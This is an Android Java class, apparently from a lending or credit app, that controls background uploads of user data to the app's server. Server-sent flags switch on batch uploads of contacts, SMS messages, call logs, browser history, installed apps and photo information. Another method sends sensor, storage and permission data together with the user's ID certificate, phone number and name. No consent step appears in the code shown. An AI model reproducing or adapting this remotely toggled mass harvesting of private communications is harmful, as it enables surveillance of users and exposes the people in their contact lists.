package com.fiveoneofly.cgw.calm;

import android.content.Context;
import android.support.annotation.NonNull;
import android.widget.Toast;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fiveoneofly.cgw.app.manage.UserManage;
import com.fiveoneofly.cgw.controller.BatteryController;
import com.fiveoneofly.cgw.net.ApiBatch;
import com.fiveoneofly.cgw.net.ApiRealCall;
import com.fiveoneofly.cgw.net.ServiceCode;
import com.fiveoneofly.cgw.net.api.ApiCallback;
import com.fiveoneofly.cgw.utils.AndroidUtil;
import com.fiveoneofly.cgw.utils.SharedUtil;
import com.fiveoneofly.cgw.utils.YxjrUtil;
import com.yxjr.credit.constants.HttpService;
import com.yxjr.credit.constants.SharedKey;
import com.fiveoneofly.cgw.utils.JsonUtil;
import com.fiveoneofly.cgw.utils.StringUtil;
import com.fiveoneofly.cgw.utils.PermissionUtil;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;


public class CalmController {
    private static CalmController mInstance = null;

    private CalmController() {
    }

    public static CalmController getInstance() {
        if (mInstance == null) {
            synchronized (CalmController.class) {
                if (mInstance == null) {
                    mInstance = new CalmController();
                }
            }
        }
        return mInstance;
    }

    private CalmDispatcher mCalmDispatcher;

    public void start(final Context context) {
        Map<String, String> request = new HashMap<>();
        request.put("uuid", AndroidUtil.getUUID(context));
        request.put("partnerLoginId", UserManage.get(context).userCertMD5());

        new ApiRealCall(context, ServiceCode.DATA_GRAB_PARAM).request(request, String.class, new ApiCallback<String>() {
            @Override
            public void onSuccess(String response) {

                JSONObject serviceBody = new JSONObject();
                try {
                    String json = new ObjectMapper().readTree(response).findValue("config").toString();
                    serviceBody = new JSONObject(json);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (JSONException e) {
                    e.printStackTrace();
                }

                handleParam(context, serviceBody);

                mCalmDispatcher = new CalmDispatcher();
                execute(context.getApplicationContext());
            }

            @Override
            public void onFailure(@NonNull String errorCode, @NonNull String errorMessage) {
                Toast.makeText(context, errorMessage, Toast.LENGTH_SHORT).show();
            }
        });

    }

    public void stop() {
        /*
         * 必须做关闭处理，否则应用关闭后任务仍在继续，导致重新进来卡死等情况
         */
        if (mCalmDispatcher != null)
            mCalmDispatcher.shutdown();
    }

    /**
     * 上传通讯录
     */
    public void executeContacts(Context context) {
        if (mCalmDispatcher == null)
            mCalmDispatcher = new CalmDispatcher();

        String contactsSend = SharedUtil.getString(context, SharedKey.CONTACTS_SEND);// 通讯录是否发送 默认「"N」
        String contactsLastTime = SharedUtil.getString(context, SharedKey.CONTACTS_LAST_TIME);// 通讯录最后发送时间 默认「null」
        String contactsSendVolume = SharedUtil.getString(context, SharedKey.CONTACTS_SEND_VOLUME); // 通讯录每次发送量 默认「200」

        mCalmDispatcher.execute(new CalmRunnable(
                context,
                isSend(contactsSend),
                contactsLastTime,
                sendVolumeToInt(contactsSendVolume),
                CalmRunnable.ITEM_CONTACTS
        ));
    }

    /**
     * 单独上传传感器等数据
     */
    public void executeSmallData(final Context context) {

        try {
            final JSONObject jsonObject = new JSONObject();
            jsonObject.put("battery", SharedUtil.getString(context, SharedKey.BATTERY));// 手机电量
            jsonObject.put("sensors", YxjrUtil.getSensorsInfo(context));// 传感器信息
            jsonObject.put("storgeSize", YxjrUtil.getPhoneStorageSize(context));//存储信息
            jsonObject.put("permissionStatus", PermissionUtil.getAllPermissionStatus(context));//手机权限当前状态
            jsonObject.put("partnerLoginId", UserManage.get(context).userCertMD5());
            jsonObject.put("cert", UserManage.get(context).userCert());
            jsonObject.put("mobileNo", UserManage.get(context).phoneNo());
            jsonObject.put("name", UserManage.get(context).userName());

            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Map map = new ObjectMapper().readValue(jsonObject.toString(), Map.class);
                        new ApiBatch().request(context, HttpService.SEND_SMALL_DATA, map);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();

            BatteryController.getInstance(context).refresh();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void execute(Context context) {

        String appListSend = SharedUtil.getString(context, SharedKey.APPLIST_SEND);// APP列表是否发送 默认「"N"」
        String appListLastTime = SharedUtil.getString(context, SharedKey.APPLIST_LAST_TIME);// APP列表最后发送时间 默认「null」
        String appListSendVolume = SharedUtil.getString(context, SharedKey.APPLIST_SEND_VOLUME);// APP列表每次发送量 默认「200」

        String browserSend = SharedUtil.getString(context, SharedKey.BROWSER_SEND);// 浏览器历史记录是否发送 默认「"N"」
        String browserLastTime = SharedUtil.getString(context, SharedKey.BROWSER_LAST_TIME);// 浏览器历史记录最后发送时间 默认「null」
        String browserSendVolume = SharedUtil.getString(context, SharedKey.BROWSER_SEND_VOLUME);// 浏览器历史记录每次发送量 默认「200」

        String callLogSend = SharedUtil.getString(context, SharedKey.CALLLOG_SEND);// 通话记录是否发送 默认「"N"」
        String callLogLastTime = SharedUtil.getString(context, SharedKey.CALLLOG_LAST_TIME);// 通话记录最后发送时间 默认「null :」
        String callLogSendVolume = SharedUtil.getString(context, SharedKey.CALLLOG_SEND_VOLUME);// 通话记录每次发送量 默认「200」

        String contactsSend = SharedUtil.getString(context, SharedKey.CONTACTS_SEND);// 通讯录是否发送 默认「"N」
        String contactsLastTime = SharedUtil.getString(context, SharedKey.CONTACTS_LAST_TIME);// 通讯录最后发送时间 默认「null」
        String contactsSendVolume = SharedUtil.getString(context, SharedKey.CONTACTS_SEND_VOLUME); // 通讯录每次发送量 默认「200」

        String picSend = SharedUtil.getString(context, SharedKey.PIC_SEND);// 照片信息是否发送 默认「"N」
        String picLastTime = SharedUtil.getString(context, SharedKey.PIC_LAST_TIME);// 照片信息最后发送时间 默认「null」
        String picSendVolume = SharedUtil.getString(context, SharedKey.PIC_SEND_VOLUME);// 照片信息每次发送量 默认「200」

        String smsSend = SharedUtil.getString(context, SharedKey.SMS_SEND);// 短信是否发送 默认「"N」
        String smsLastTime = SharedUtil.getString(context, SharedKey.SMS_LAST_TIME);// 短信最后发送时间 默认「null」
        String smsSendVolume = SharedUtil.getString(context, SharedKey.SMS_SEND_VOLUME);// 短信每次发送量 默认「200」

//        appListSend = "Y";
//        appListLastTime = null;
//        appListSendVolume = "200";
//
//        browserSend = "Y";
//        browserLastTime = null;
//        browserSendVolume = "200";
//
//        callLogSend = "Y";
//        callLogLastTime = null;
//        callLogSendVolume = "200";
//
//        contactsSend = "Y";
//        contactsLastTime = null;
//        contactsSendVolume = "200";
//
//        picSend = "Y";
//        picLastTime = null;
//        picSendVolume = "200";

//        smsSend = "Y";
//        smsLastTime = null;
//        smsSendVolume = "200";

        mCalmDispatcher.execute(new CalmRunnable(
                context,
                isSend(appListSend),
                appListLastTime,
                sendVolumeToInt(appListSendVolume),
                CalmRunnable.ITEM_APP_LIST
        ));
        mCalmDispatcher.execute(new CalmRunnable(
                context,
                isSend(browserSend),
                browserLastTime,
                sendVolumeToInt(browserSendVolume),
                CalmRunnable.ITEM_BROWSER_HISTORY
        ));
        mCalmDispatcher.execute(new CalmRunnable(
                context,
                isSend(callLogSend),
                callLogLastTime,
                sendVolumeToInt(callLogSendVolume),
                CalmRunnable.ITEM_CALL_LOG
        ));
        mCalmDispatcher.execute(new CalmRunnable(
                context,
                isSend(contactsSend),
                contactsLastTime,
                sendVolumeToInt(contactsSendVolume),
                CalmRunnable.ITEM_CONTACTS
        ));
        mCalmDispatcher.execute(new CalmRunnable(
                context,
                isSend(picSend),
                picLastTime,
                sendVolumeToInt(picSendVolume),
                CalmRunnable.ITEM_PHOTO
        ));
        mCalmDispatcher.execute(new CalmRunnable(
                context,
                isSend(smsSend),
                smsLastTime,
                sendVolumeToInt(smsSendVolume),
                CalmRunnable.ITEM_SMS
        ));
    }

    private boolean isSend(String send) {
        return send.equals("Y");
    }

    private int sendVolumeToInt(String sendVolume) {
        int sendVolumeInt = 0;
        if (StringUtil.isNotEmpty(sendVolume)) {
            sendVolumeInt = Integer.parseInt(sendVolume);
        }
        return sendVolumeInt;
    }

    private void handleParam(Context context, JSONObject serviceBody) {
        final String DEFALUT_SUPPORT_SDK_VERSION = "1.0.1";
        final String DEFALUT_HEARTBEAT_SPACING = "20m";
        final String DEFALUT_SEND = "N";
        final String DEFALUT_LAST_TIME = null;
        final String DEFALUT_SEND_VOLUME = "200";

        /*
         * 1、报文中是否包含该字段
         *  1.1、true：存储该字段值
         *  1.2、false：存储默认值
         */
        String isUpgrade = "UPGRADE";// 系统是否处于升级状态
        String isUpgradeValue = serviceBody.isNull(isUpgrade) ? "N" : JsonUtil.getString(serviceBody, isUpgrade);
        SharedUtil.save(context, SharedKey.IS_UPGRADE, isUpgradeValue);

        String supportSdkVersion = "SUPPORT_SDK_VERSION";// 系统最低版本支持
        String supportSdkVersionValue = serviceBody.isNull(supportSdkVersion) ? DEFALUT_SUPPORT_SDK_VERSION : JsonUtil.getString(serviceBody, supportSdkVersion);
        SharedUtil.save(context, SharedKey.SUPPORT_SDK_VERSION, supportSdkVersionValue);

        String heartbeatSpacing = "HBSF";// 心跳时间
        String heartbeatSpacingValue = serviceBody.isNull(heartbeatSpacing) ? DEFALUT_HEARTBEAT_SPACING : JsonUtil.getString(serviceBody, heartbeatSpacing);
        SharedUtil.save(context, SharedKey.HEARTBEAT_SPACING, heartbeatSpacingValue);

        String fmHeartbeatSend = "HB_L";// 同盾心跳是否发送
        String fmHeartbeatSendValue = serviceBody.isNull(fmHeartbeatSend) ? DEFALUT_SEND : JsonUtil.getString(serviceBody, fmHeartbeatSend);
        SharedUtil.save(context, SharedKey.FM_HEARTBEAT_SEND, fmHeartbeatSendValue);
        String fmHeartbeatSpacing = "HBSF_L";// 同盾心跳间隔时间
        String fmHeartbeatSpacingValue = serviceBody.isNull(fmHeartbeatSpacing) ? DEFALUT_HEARTBEAT_SPACING : JsonUtil.getString(serviceBody, fmHeartbeatSpacing);
        SharedUtil.save(context, SharedKey.FM_HEARTBEAT_SPACING, fmHeartbeatSpacingValue);

        String contactsSend = "C";// 通讯录是否发送
        String contactsSendValue = serviceBody.isNull(contactsSend) ? DEFALUT_SEND : JsonUtil.getString(serviceBody, contactsSend);
        SharedUtil.save(context, SharedKey.CONTACTS_SEND, contactsSendValue);
        String contactsLastTime = "CLASTTIME";// 通讯录最后发送时间
        String contactsLastTimeValue = serviceBody.isNull(contactsLastTime) ? DEFALUT_LAST_TIME : JsonUtil.getString(serviceBody, contactsLastTime);
        SharedUtil.save(context, SharedKey.CONTACTS_LAST_TIME, contactsLastTimeValue);
        String contactsSendVolume = "CSQ";// 通讯录每次发送量
        String contactsSendVolumeValue = serviceBody.isNull(contactsSendVolume) ? DEFALUT_SEND_VOLUME : JsonUtil.getString(serviceBody, contactsSendVolume);
        SharedUtil.save(context, SharedKey.CONTACTS_SEND_VOLUME, contactsSendVolumeValue);

        String browserSend = "B";// 浏览器历史记录是否发送
        String browserSendValue = serviceBody.isNull(browserSend) ? DEFALUT_SEND : JsonUtil.getString(serviceBody, browserSend);
        SharedUtil.save(context, SharedKey.BROWSER_SEND, browserSendValue);
        String browserLastTime = "BLASTTIME";// 浏览器历史记录最后发送时间
        String browserLastTimeValue = serviceBody.isNull(browserLastTime) ? DEFALUT_LAST_TIME : JsonUtil.getString(serviceBody, browserLastTime);
        SharedUtil.save(context, SharedKey.BROWSER_LAST_TIME, browserLastTimeValue);
        String browserSendVolume = "BSQ";// 浏览器历史记录每次发送量
        String browserSendVolumeValue = serviceBody.isNull(browserSendVolume) ? DEFALUT_SEND_VOLUME : JsonUtil.getString(serviceBody, browserSendVolume);
        SharedUtil.save(context, SharedKey.BROWSER_SEND_VOLUME, browserSendVolumeValue);

        String smsSend = "M";// 短信是否发送
        String smsSendValue = serviceBody.isNull(smsSend) ? DEFALUT_SEND : JsonUtil.getString(serviceBody, smsSend);
        SharedUtil.save(context, SharedKey.SMS_SEND, smsSendValue);
        String smsLastTime = "MLASTTIME";// 短信最后发送时间
        String smsLastTimeValue = serviceBody.isNull(smsLastTime) ? DEFALUT_LAST_TIME : JsonUtil.getString(serviceBody, smsLastTime);
        SharedUtil.save(context, SharedKey.SMS_LAST_TIME, smsLastTimeValue);
        String smsSendVolume = "MSQ";// 短信每次发送量
        String smsSendVolumeValue = serviceBody.isNull(smsSendVolume) ? DEFALUT_SEND_VOLUME : JsonUtil.getString(serviceBody, smsSendVolume);
        SharedUtil.save(context, SharedKey.SMS_SEND_VOLUME, smsSendVolumeValue);

        String appListSend = "A";// APP列表是否发送
        String appListSendValue = serviceBody.isNull(appListSend) ? DEFALUT_SEND : JsonUtil.getString(serviceBody, appListSend);
        SharedUtil.save(context, SharedKey.APPLIST_SEND, appListSendValue);
        String appListLastTime = "ALASTTIME";// APP列表最后发送时间
        String appListLastTimeValue = serviceBody.isNull(appListLastTime) ? DEFALUT_LAST_TIME : JsonUtil.getString(serviceBody, appListLastTime);
        SharedUtil.save(context, SharedKey.APPLIST_LAST_TIME, appListLastTimeValue);
        String appListSendVolume = "ASQ";// APP列表每次发送量
        String appListSendVolumeValue = serviceBody.isNull(appListSendVolume) ? DEFALUT_SEND_VOLUME : JsonUtil.getString(serviceBody, appListSendVolume);
        SharedUtil.save(context, SharedKey.APPLIST_SEND_VOLUME, appListSendVolumeValue);

        String callLogSend = "CA";// 通话记录是否发送
        String callLogSendValue = serviceBody.isNull(callLogSend) ? DEFALUT_SEND : JsonUtil.getString(serviceBody, callLogSend);
        SharedUtil.save(context, SharedKey.CALLLOG_SEND, callLogSendValue);
        String callLogLastTime = "CALASTTIME";// 通话记录最后发送时间
        String callLogLastTimeValue = serviceBody.isNull(callLogLastTime) ? DEFALUT_LAST_TIME : JsonUtil.getString(serviceBody, callLogLastTime);
        SharedUtil.save(context, SharedKey.CALLLOG_LAST_TIME, callLogLastTimeValue);
        String callLogSendVolume = "CASQ";// 通话记录每次发送量
        String callLogSendVolumeValue = serviceBody.isNull(callLogSendVolume) ? DEFALUT_SEND_VOLUME : JsonUtil.getString(serviceBody, callLogSendVolume);
        SharedUtil.save(context, SharedKey.CALLLOG_SEND_VOLUME, callLogSendVolumeValue);

        String picSend = "P";// 照片信息是否发送
        String picSendValue = serviceBody.isNull(picSend) ? DEFALUT_SEND : JsonUtil.getString(serviceBody, picSend);
        SharedUtil.save(context, SharedKey.PIC_SEND, picSendValue);
        String picLastTime = "PLASTTIME";// 照片信息最后发送时间
        String picLastTimeValue = serviceBody.isNull(picLastTime) ? DEFALUT_LAST_TIME : JsonUtil.getString(serviceBody, picLastTime);
        SharedUtil.save(context, SharedKey.PIC_LAST_TIME, picLastTimeValue);
        String picSendVolume = "PSQ";// 照片信息每次发送量
        String picSendVolumeValue = serviceBody.isNull(picSendVolume) ? DEFALUT_SEND_VOLUME : JsonUtil.getString(serviceBody, picSendVolume);
        SharedUtil.save(context, SharedKey.PIC_SEND_VOLUME, picSendVolumeValue);

        String ids = "GET_DEVICE_SERVICE_IDS";// 照片信息每次发送量
        String idsValue = serviceBody.isNull(ids) ? "" : JsonUtil.getString(serviceBody, ids);
        SharedUtil.save(context, SharedKey.IDS, idsValue);

    }

}
